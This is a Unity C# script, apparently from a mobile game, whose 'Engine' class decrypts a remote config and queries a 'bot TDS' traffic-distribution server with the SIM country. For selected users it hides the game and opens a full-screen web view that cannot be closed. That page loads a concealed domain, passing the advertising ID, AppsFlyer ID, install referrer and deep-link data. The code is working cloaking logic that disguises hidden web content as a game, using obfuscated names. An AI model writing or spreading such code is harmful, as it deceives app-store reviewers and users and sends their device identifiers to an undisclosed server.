using AppsFlyerSDK;
using pingak9;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using Ugi.PlayInstallReferrerPlugin;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.RemoteConfig;

public class Engine : MonoBehaviour
{
	private static Engine instance;
	public static Engine Instance
	{
		get
		{
			if (!instance)
			{
				instance = FindObjectOfType<Engine>();
			}

			return instance;
		}
	}

	bool servicesInitialized;
	bool dialogIsShowed;
	//bool af_status_isGet;

	[HideInInspector]
	public bool noNetwork;

	[HideInInspector]
	public bool AM_DEVICE_IDGet;

	[HideInInspector]
	public string dl_url;

	string target;
	string config = null;

	string GAID = "[NONE]";
	string referrer = "[NONE]";
	string AM_DEVICE_ID = "[NONE]";
	//object af_status = "[NONE]";
	string appsFlyerUID = "[NONE]";

	delegate void FinalActionHandler(string campaign);
	event FinalActionHandler OnFinalActionEvent;

	public struct UserAttributes { }
	public struct AppAttributes { }

	[HideInInspector]
	public Container container;

	[HideInInspector]
	public EncryptData encryptData;

	public bool IsWaitAppmetrica
	{
		get => string.IsNullOrEmpty(container.initData.appmetricaAppId_prop) || string.IsNullOrWhiteSpace(container.initData.appmetricaAppId_prop);
	}

	private void OnEnable()
	{
		OnFinalActionEvent += Engine_OnFinalActionEvent;
	}

	private void OnDisable()
	{
		OnFinalActionEvent -= Engine_OnFinalActionEvent;
	}

	private void Engine_OnFinalActionEvent(string campaign)
	{
		if (string.IsNullOrEmpty(campaign) || string.IsNullOrWhiteSpace(campaign))
		{
			Screen.fullScreen = true;
			UnityEngine.SceneManagement.SceneManager.LoadScene(1);
		}
		else
		{
			Init(campaign);
		}
	}

	async Task Awake()
	{
		if (Utilities.CheckForInternetConnection())
		{
			await InitializeRemoteConfigAsync();
		}

		RemoteConfigService.Instance.FetchCompleted += (responce) =>
		{
			config = RemoteConfigService.Instance.appConfig.GetJson("data");
			PlayerPrefsUtil.SetConfig(config);
		};

		await RemoteConfigService.Instance.FetchConfigsAsync(new UserAttributes(), new AppAttributes());
		servicesInitialized = true;
	}

	async Task InitializeRemoteConfigAsync()
	{
		// initialize handlers for unity game services
		await UnityServices.InitializeAsync();

		// remote config requires authentication for managing environment information
		if (!AuthenticationService.Instance.IsSignedIn)
		{
			await AuthenticationService.Instance.SignInAnonymouslyAsync();
		}
	}

	IEnumerator Start()
	{
		Screen.fullScreen = false;
		dialogIsShowed = false;

		while (Application.internetReachability == NetworkReachability.NotReachable)
		{
			if (!dialogIsShowed)
			{
				noNetwork = true;
				dialogIsShowed = true;

				NativeDialog.OpenDialog("Error", "Check internet connection, show settings ?", "Yes", "No", () =>
				{
					dialogIsShowed = false;
					NativeUtil.Show_Dialog_Wireless_Settings();
				},
				() =>
				{
					dialogIsShowed = false;
					OnFinalActionEvent?.Invoke(string.Empty);
				});
			}
			else
			{
				yield return null;
			}
		}

		noNetwork = false;

		while (!servicesInitialized)
		{
			yield return null;
		}

		config = PlayerPrefsUtil.GetConfig();
		container = Decriptor.GetData(config, out encryptData);

		AppsFlyer.setIsDebug(true);
		//AppsFlyer.initSDK(container.initData.appsFlyerAppId_prop, "", this);
		AppsFlyer.initSDK(container.initData.appsFlyerAppId_prop, "");
		AppsFlyer.startSDK();
		appsFlyerUID = AppsFlyer.getAppsFlyerId();

		if (encryptData != null)
		{
			StartCoroutine(nameof(SetupEncryptDataNoNull));
		}
		else
		{
			OnFinalActionEvent?.Invoke(string.Empty);
		}
	}

	IEnumerator SetupEncryptDataNoNull()
	{
		bool referrerGet = false;

		PlayInstallReferrer.GetInstallReferrerInfo((installReferrerDetails) =>
		{
			if (installReferrerDetails.Error != null) return;

			if (installReferrerDetails.InstallReferrer != null)
			{
				referrer = installReferrerDetails.InstallReferrer;
				referrerGet = true;
			}
		});

		//while (!referrerGet || !AM_DEVICE_IDGet || !af_status_isGet)
		while (!referrerGet || !AM_DEVICE_IDGet)
		{
			yield return null;
		}

		string responce_from_server = PlayerPrefsUtil.GetBotTDSResponce();

		if (responce_from_server == null)
		{
			string _base = string.Concat(encryptData.protocol, encryptData.domen_prop, ".", encryptData.space_prop, "/", encryptData.requestCampaign_prop, "?", encryptData.sim_geo, "=", Simcard.Instance.GetTwoSmallLetterCountryCodeISO().ToUpper());
			StartCoroutine(Get_First_Request(_base));
		}
		else
		{
			RespoceData respoceData = JsonUtility.FromJson<RespoceData>(responce_from_server);
			OnFinalActionEvent?.Invoke(respoceData.gee3vcv3f3r ?? string.Empty);
		}
	}

	IEnumerator Get_First_Request(string uri)
	{
		UnityWebRequest webRequest = UnityWebRequest.Get(uri);
		yield return webRequest.SendWebRequest();

		string bot_tds_responce = webRequest.downloadHandler.text;
		RespoceData respoceData = JsonUtility.FromJson<RespoceData>(bot_tds_responce);
		PlayerPrefsUtil.SetBotTDSResponce(bot_tds_responce);

		OnFinalActionEvent?.Invoke(respoceData.gee3vcv3f3r ?? string.Empty);
	}

	(string scheme, string url, string url2, string other) DL
	{
		get
		{
			if (string.IsNullOrEmpty(dl_url) || string.IsNullOrWhiteSpace(dl_url))
			{
				return ("[NONE_SCHEME]", "[NONE_URL]", "[NONE_URL2]", "[NONE_OTHER]");
			}

			string[] parts = dl_url.Split(new string[] { "//", "&", "?" }, StringSplitOptions.None);

			return (parts[0], parts[1], parts[2], parts[3]);
		}
	}

	//public void onConversionDataSuccess(string conversionData)
	//{
	//	AppsFlyer.AFLog("onConversionDataSuccess", conversionData);
	//	Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
	//	conversionDataDictionary.TryGetValue("af_status", out af_status);

	//	af_status_isGet = true;
	//}

	//public void onConversionDataFail(string error)
	//{
	//	AppsFlyer.AFLog("onConversionDataFail", error);
	//}

	//public void onAppOpenAttribution(string attributionData)
	//{
	//	AppsFlyer.AFLog("onAppOpenAttribution", attributionData);
	//	Dictionary<string, object> attributionDataDictionary = AppsFlyer.CallbackStringToDictionary(attributionData);
	//}

	//public void onAppOpenAttributionFailure(string error)
	//{
	//	AppsFlyer.AFLog("onAppOpenAttributionFailure", error);
	//}

	void Init(string campaign)
	{
		new GameObject("Manager").AddComponent<Flipmorris.Manager>();

		AM_DEVICE_ID = PlayerPrefsUtil.GetAMDeviceID();
		GAID = NativeUtil.Get_GAID();

		target = Get_Url_With_Campaign(campaign);

		UniWebView view = gameObject.AddComponent<UniWebView>();
		Camera.main.backgroundColor = Color.black;
		GameObject.Find("bar").SetActive(false);

		view.ReferenceRectTransform = InitInterface();
		view.SetShowSpinnerWhileLoading(false);
		view.BackgroundColor = Color.white;
		view.OnShouldClose += (v) => { return false; };
		view.Load(target);
		view.OnPageStarted += (browser, url) => { view.Show(); view.UpdateFrame(); };
		view.OnPageFinished += (browser, code, url) =>
		{
			if (view.Url.Contains(encryptData.domen_prop))
			{
				OnFinalActionEvent?.Invoke(string.Empty);
			}
		};
	}

	string Get_Url_With_Campaign(string campaign)
	{
		return string.Concat(encryptData.protocol, encryptData.domen_prop, ".", encryptData.space_prop, "/", campaign, "?", encryptData.bundle, "=", encryptData.bundle_prop, "&", encryptData.amidentificator, "=", AM_DEVICE_ID, "&", encryptData.afidentificator, "=", appsFlyerUID, "&", encryptData.googleid, "=", GAID, "&", encryptData.subcodename, "=", encryptData.subcodename_prop, "&", encryptData.appref, "=", referrer, "&", encryptData.dl_url, "=", DL.url, "&", encryptData.dl_url2, "=", DL.url2);
	}

	RectTransform InitInterface()
	{
		GameObject _interface = new GameObject("Interface", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));

		Canvas _canvas = _interface.GetComponent<Canvas>();
		_canvas.renderMode = RenderMode.ScreenSpaceCamera;
		_canvas.worldCamera = Camera.main;

		CanvasScaler _canvasScaler = _interface.GetComponent<CanvasScaler>();
		_canvasScaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
		_canvasScaler.referenceResolution = new Vector2(Screen.width, Screen.height);
		_canvasScaler.matchWidthOrHeight = 0.5f;

		GameObject activity = new GameObject("Privacy activity", typeof(RectTransform));
		activity.transform.SetParent(_interface.transform, false);
		RectTransform _rectTransform = activity.GetComponent<RectTransform>();

		_rectTransform.anchorMin = Vector2.zero;
		_rectTransform.anchorMax = Vector2.one;
		_rectTransform.pivot = Vector2.one / 2;
		_rectTransform.sizeDelta = Vector2.zero;
		_rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);

		return _rectTransform;
	}
}
